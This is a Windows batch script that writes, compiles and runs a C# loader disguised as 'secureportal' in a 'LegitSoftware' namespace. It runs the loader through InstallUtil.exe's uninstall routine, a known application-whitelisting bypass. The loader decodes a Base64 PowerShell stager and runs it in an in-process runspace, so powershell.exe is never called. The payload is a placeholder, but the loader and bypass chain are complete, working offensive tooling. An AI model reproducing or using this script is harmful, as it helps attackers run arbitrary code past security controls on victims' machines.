@echo off
pushd %~dp0
setlocal enableextensions
if exist secureportal.cs del secureportal.cs
for /f "tokens=*" %a in ('where /r "C:\Windows\Microsoft.NET\Framework" "csc.exe"') do (set myvar=%a)
for /f "tokens=*" %b in ('where /r "C:\windows\assembly" "system.management.automation.dll"') do (set myvar2=%b)
echo using System; >> secureportal.cs
echo using System.Text; >> secureportal.cs
echo using System.Collections.ObjectModel; >> secureportal.cs
echo using System.Management.Automation; >> secureportal.cs
echo using System.Management.Automation.Runspaces; >> secureportal.cs
echo namespace LegitSoftware >> secureportal.cs
echo { >> secureportal.cs
   echo [System.ComponentModel.RunInstaller(true)] >> secureportal.cs
   echo public class InstallUtil : System.Configuration.Install.Installer >> secureportal.cs
   echo { >> secureportal.cs
       echo public override void Install(System.Collections.IDictionary savedState) >> secureportal.cs
       echo { >> secureportal.cs
       echo } >> secureportal.cs
       echo public override void Uninstall(System.Collections.IDictionary savedState) >> secureportal.cs
       echo { >> secureportal.cs
           echo Program.Main(); >> secureportal.cs
       echo } >> secureportal.cs
   echo } >> secureportal.cs
    echo class Program >> secureportal.cs
    echo { >> secureportal.cs
        echo static string RunPS(string cmd) >> secureportal.cs
        echo { >> secureportal.cs
            echo Runspace runspace = RunspaceFactory.CreateRunspace(); >> secureportal.cs
            echo runspace.Open(); >> secureportal.cs
            echo RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace); >> secureportal.cs
            echo Pipeline pipeline = runspace.CreatePipeline(); >> secureportal.cs
            echo pipeline.Commands.AddScript(cmd); >> secureportal.cs
            echo pipeline.Commands.Add("Out-String"); >> secureportal.cs
            echo Collection^<PSObject^> results = pipeline.Invoke(); >> secureportal.cs
            echo runspace.Close(); >> secureportal.cs
            echo StringBuilder stringBuilder = new StringBuilder(); >> secureportal.cs
            echo foreach (PSObject obj in results) >> secureportal.cs
            echo { >> secureportal.cs
                echo stringBuilder.Append(obj); >> secureportal.cs
            echo } >> secureportal.cs
            echo return stringBuilder.ToString().Trim(); >> secureportal.cs
        echo } >> secureportal.cs
        echo public static void Main() >> secureportal.cs
        echo { >> secureportal.cs
            echo string stager = "Insert your B64 encoded PowerShell string here"; >> secureportal.cs
            echo var decodedScript = Encoding.Unicode.GetString(Convert.FromBase64String(stager)); >> secureportal.cs
             echo string results = RunPS(decodedScript); >> secureportal.cs
        echo } >> secureportal.cs
    echo } >> secureportal.cs
echo } >> secureportal.cs
for /f "tokens=*" %c in ('where /r "C:\Windows\Microsoft.NET\Framework" "InstallUtil.exe"') do (set myvar3=%c)
start /b /wait "" "%myvar%" /reference:%myvar2% secureportal.cs
start /b %myvar3% /logfile= /LogToConsole=false /U secureportal.exe
endlocal
